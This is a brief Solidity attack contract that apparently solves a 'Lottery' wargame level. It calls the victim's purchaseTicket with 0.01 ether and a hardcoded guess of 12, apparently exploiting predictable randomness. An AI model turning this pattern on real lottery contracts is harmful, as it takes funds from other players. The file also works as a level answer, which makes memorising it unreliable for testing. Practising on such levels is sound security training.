pragma solidity ^0.4.18;

import '../levels/Lottery.sol';

contract LotteryAttack {
  Lottery lottery;

  function LotteryAttack (address _victim) payable {
    lottery = Lottery(_victim);
  }

  function attack(address target) {
    lottery.purchaseTicket.value(0.01 ether)(12);
  }
}
